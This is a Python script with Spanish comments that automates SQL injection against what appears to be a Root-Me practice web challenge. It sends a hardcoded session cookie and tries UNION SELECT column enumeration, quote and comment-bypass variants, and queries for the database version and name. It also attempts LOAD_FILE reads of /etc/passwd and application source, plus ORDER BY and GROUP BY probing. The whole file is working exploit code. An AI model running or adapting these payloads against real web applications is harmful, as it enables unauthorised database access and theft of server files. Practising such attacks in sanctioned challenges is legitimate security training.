#!/usr/bin/env python3
import requests
import time
import re

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_payload(payload):
    """Prueba un payload y retorna la respuesta"""
    params = {"action": "member", "member": payload}
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=10)
        return len(r.text), r.text
    except Exception as e:
        print(f"Error: {e}")
        return 0, ""

print("="*70)
print("  BUSCANDO NÚMEROS INYECTADOS EN RESPUESTA")
print("="*70)

# Baseline
l, baseline = test_payload("1")
print(f"Baseline: {l} bytes")

# 1. Probar diferentes números de columnas con números únicos
print("\n[1] Probando UNION SELECT con números únicos...")
for cols in range(1, 25):
    # Crear números únicos para cada columna (100, 101, 102, ...)
    numbers = [str(i + 100) for i in range(cols)]
    payload = f"1 UNION SELECT {','.join(numbers)}"
    l, content = test_payload(payload)
    
    # Buscar si algún número inyectado aparece en la respuesta
    found = False
    for num in numbers:
        if num in content and num not in baseline:
            print(f"[+] ¡NÚMERO {num} ENCONTRADO! Columnas: {cols}")
            print(f"    Payload: {payload[:80]}")
            print(f"    Contexto: {content[200:400]}...")
            found = True
            break
    
    if found:
        break
    else:
        print(f"[-] {cols} columnas: No se encontraron números")
    time.sleep(0.3)

# 2. Probar con comillas y diferentes sintaxis
print("\n[2] Probando con diferentes sintaxis...")
syntax_payloads = [
    "1' UNION SELECT 100,101,102,103,104-- -",
    "1' UNION SELECT 100,101,102,103,104,105-- -",
    "1) UNION SELECT 100,101,102,103,104-- -",
    "1) UNION SELECT 100,101,102,103,104,105-- -",
    "1'/**/UNION/**/SELECT/**/100,101,102,103,104/**/-- -",
    "1'/**/UNION/**/SELECT/**/100,101,102,103,104,105/**/-- -",
]

for payload in syntax_payloads:
    l, content = test_payload(payload)
    # Buscar números 100-105
    numbers_found = re.findall(r'\b(100|101|102|103|104|105)\b', content)
    if numbers_found:
        print(f"[+] ¡Números encontrados! {payload[:50]}")
        print(f"    Números: {numbers_found}")
        print(f"    Contexto: {content[200:400]}...")
        break
    else:
        print(f"[-] No funcionó: {payload[:50]}")
    time.sleep(0.3)

# 3. Extraer versión de la base de datos
print("\n[3] Extrayendo versión de la base de datos...")
version_queries = [
    "SELECT VERSION()",
    "SELECT @@VERSION",
    "SELECT SQLITE_VERSION()",
    "SELECT version()",
]

for query in version_queries:
    for cols in range(1, 10):
        # Crear payload con la query en la primera columna y NULL en las demás
        payload = f"1 UNION SELECT {query}"
        if cols > 1:
            payload += f",{','.join(['NULL']*(cols-1))}"
        
        l, content = test_payload(payload)
        
        # Buscar patrones de versión
        version_pattern = r'\b\d+\.\d+(\.\d+)?\b'
        versions = re.findall(version_pattern, content)
        
        if versions:
            print(f"[+] Posible versión encontrada: {versions}")
            print(f"    Query: {query}")
            print(f"    Columnas: {cols}")
            print(f"    Contexto: {content[200:400]}...")
            break
        
        # Buscar palabras clave de bases de datos
        if any(word in content for word in ['MySQL', 'PostgreSQL', 'SQLite', 'MariaDB']):
            print(f"[+] ¡Tipo de DB encontrado! {query}")
            print(f"    Columnas: {cols}")
            print(f"    Contexto: {content[200:400]}...")
            break
        
        time.sleep(0.3)

# 4. Extraer nombre de la base de datos
print("\n[4] Extrayendo nombre de la base de datos...")
db_queries = [
    "SELECT DATABASE()",
    "SELECT current_database()",
    "SELECT DB_NAME()",
]

for query in db_queries:
    for cols in range(1, 10):
        payload = f"1 UNION SELECT {query}"
        if cols > 1:
            payload += f",{','.join(['NULL']*(cols-1))}"
        
        l, content = test_payload(payload)
        
        # Si la longitud cambia, puede ser un nombre
        if l != 794:
            print(f"[+] Posible nombre de DB: {query}")
            print(f"    Columnas: {cols}")
            print(f"    Longitud: {l}")
            print(f"    Contexto: {content[200:400]}...")
            break
        
        time.sleep(0.3)

# 5. Probar LOAD_FILE con diferentes archivos
print("\n[5] Probando LOAD_FILE...")
files = [
    '/etc/passwd',
    '/etc/hosts',
    '/var/www/html/index.php',
    'index.php',
    '../index.php',
    '../../index.php',
]

for file_path in files:
    for cols in range(1, 10):
        payload = f"1 UNION SELECT LOAD_FILE('{file_path}')"
        if cols > 1:
            payload += f",{','.join(['NULL']*(cols-1))}"
        
        l, content = test_payload(payload)
        
        # Buscar contenido de archivos
        if "root:" in content or "www-data" in content:
            print(f"[+] ¡ARCHIVO ENCONTRADO! {file_path}")
            print(f"    Columnas: {cols}")
            print(f"    Contenido: {content[:500]}...")
            break
        
        if l != 794:
            print(f"[!] Posible contenido: {file_path}")
            print(f"    Longitud: {l}")
            print(f"    Contexto: {content[200:400]}...")
            break
        
        time.sleep(0.3)

# 6. Probar con ORDER BY para confirmar columnas
print("\n[6] Probando ORDER BY...")
for i in range(1, 20):
    payload = f"1 ORDER BY {i}"
    l, content = test_payload(payload)
    
    # Si hay error o cambio
    if "error" in content.lower() or "sql" in content.lower():
        print(f"[+] Límite de columnas: {i-1}")
        print(f"    Payload: {payload}")
        print(f"    Contexto: {content[:300]}...")
        break
    else:
        print(f"[-] ORDER BY {i}: OK")
    time.sleep(0.3)

# 7. Probar con GROUP BY
print("\n[7] Probando GROUP BY...")
for i in range(1, 20):
    payload = f"1 GROUP BY {i}"
    l, content = test_payload(payload)
    
    if "error" in content.lower() or "sql" in content.lower():
        print(f"[+] Límite de GROUP BY: {i-1}")
        break
    time.sleep(0.3)

print("\n" + "="*70)
print("  RESUMEN FINAL")
print("="*70)
print("Si encontraste números en la respuesta, UNION SELECT funciona.")
print("Si encontraste versiones, la base de datos es accesible.")
print("Si encontraste archivos, la inyección es muy poderosa.")
